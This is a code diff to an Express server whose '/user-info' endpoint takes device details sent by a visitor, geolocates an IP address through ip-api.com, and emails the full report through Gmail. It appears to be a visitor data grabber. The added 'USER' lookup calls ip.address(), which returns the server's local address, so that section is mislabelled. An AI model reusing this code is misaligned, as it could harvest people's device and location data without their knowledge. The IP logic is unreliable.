@@ -3,6 +3,7 @@ const app = express()
 const nodemailer = require("nodemailer")
 const session = require('express-session')
 const axios = require('axios')
+const ip = require('ip')
 
 require('dotenv').config()
 
@@ -102,12 +103,18 @@ app.post('/user-info', async (req, res) => {
 
     const response = await axios.get('http://api.ipify.org/')
 
-    const ip = response.data
-    const url = `http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`
+    const ipAddress = response.data
+    const url = `http://ip-api.com/json/${ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`
     const ip_api = await axios.get(url)
+
+    const userIp = ip.address()
+    const url2 = `http://ip-api.com/json/${userIp}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`
+    const ip_api2 = await axios.get(url2)
+
 
     const sys = req.body
     const loc = ip_api.data
+    const loc2 = ip_api2.data
 
     let transporter = nodemailer.createTransport({
       service: "Gmail",
@@ -133,7 +140,7 @@ app.post('/user-info', async (req, res) => {
             <p>Product: ${sys.product}</p>
             <p>Manufacturer: ${sys.manufacturer}</p>
             <br>
-            <h3 style="color: red">Location Info</h3>
+            <h3 style="color: red">Location Info SERVER</h3>
             <p>Status: ${loc.status}</p>
             <p>Continent: ${loc.continent}</p>
             <p>Continent Code: ${loc.continentCode}</p>
@@ -156,6 +163,31 @@ app.post('/user-info', async (req, res) => {
             <p>Proxy: ${loc.proxy}</p>
             <p>Hosting: ${loc.hosting}</p>
             <p>Query: ${loc.query}</p>
+
+            <br>
+            <h3 style="color: red">Location Info USER</h3>
+            <p>Status: ${loc2.status}</p>
+            <p>Continent: ${loc2.continent}</p>
+            <p>Continent Code: ${loc2.continentCode}</p>
+            <p>Region: ${loc2.region}</p>
+            <p>Region Name: ${loc2.regionName}</p>
+            <p>City: ${loc2.city}</p>
+            <p>District: ${loc2.district}</p>
+            <p>ZIP: ${loc2.zip}</p>
+            <p>Latitude: ${loc2.lat}</p>
+            <p>Longitude: ${loc2.lon}</p>
+            <p>Timezone: ${loc2.timezone}</p>
+            <p>Offset: ${loc2.offset}</p>
+            <p>Currency: ${loc2.currency}</p>
+            <p>Internet service provider: ${loc2.isp}</p>
+            <p>Org: ${loc2.org}</p>
+            <p>as: ${loc2.as}</p>
+            <p>as name: ${loc2.asname}</p>
+            <p>Reverse: ${loc2.reverse}</p>
+            <p>Mobile: ${loc2.mobile}</p>
+            <p>Proxy: ${loc2.proxy}</p>
+            <p>Hosting: ${loc2.hosting}</p>
+            <p>Query: ${loc2.query}</p>
             `
     })
   }
